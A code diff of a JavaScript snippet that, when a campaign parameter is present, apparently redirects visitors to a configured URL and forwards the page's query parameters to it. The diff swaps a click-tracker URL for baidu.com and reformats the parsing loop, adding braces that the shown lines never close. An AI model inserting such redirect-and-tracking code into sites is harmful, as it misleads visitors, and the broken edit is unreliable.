@@ -1,5 +1,5 @@
 var _boSettings = {
-  url: "https://tracker1.cmclicks000.com/click.php?key=9wslfwqxaygjewdc8c80",
+  url: "https://www.baidu.com",
   exSelectors: ["body", "body *"],
 };
 var searchParams = new URLSearchParams(window.location.search);
@@ -12,12 +12,12 @@ if (campaignQuery) {
   var a = b._boSettings || {},
     k = a.url || "",
     n = (a.exSelectors || []).join(", "),
-    l = a.boAttr || "b0",
-    p = a.stopParams || [],
-    q = !1,
-    r = void 0,
-    x = {}.toString,
-    t = !1;
+    l = a.boAttr || "",  
+    p = a.stopParams || [],  
+    q = !1,  
+    r = void 0,  
+    x = {}.toString,  
+    t = !1;  
   a = h.documentElement;
   var y =
       a.matches ||
@@ -45,21 +45,21 @@ if (campaignQuery) {
       var f = "",
         d = b.location.href,
         a = 1;
-      try {
-        d =
-          ~d.indexOf("?") &&
-          d
-            .slice(d.indexOf("?") + 1)
-            .replace("#", "&")
-            .split("&");
-      } catch (C) {
-        d = "";
-      }
-      if ("[object Array]" === x.call(d))
-        for (var e = 0; e < d.length; e++) {
-          var c = d[e].split("=");
-          c[0] &&
-            !~z.call(p, c[0]) &&
+        try {  
+          d =  
+            ~d.indexOf("?") &&  
+            d  
+              .slice(d.indexOf("?") + 1)  
+              .replace("#", "&")  
+              .split("&");  
+        } catch (C) {  
+          d = "";  
+        }  
+      
+        if ("[object Array]" === x.call(d)) {  
+          for (var e = 0; e < d.length; e++) {  
+            var c = d[e].split("=");  
+            if (c[0] && !~z.call(p, c[0])) {  
             (f += "&" + c[0] + "=" + ((void 0 !== c[1] && c[1]) || ""));
           c[0] === l && (a = (+c[1] || 0) + 1);
         }
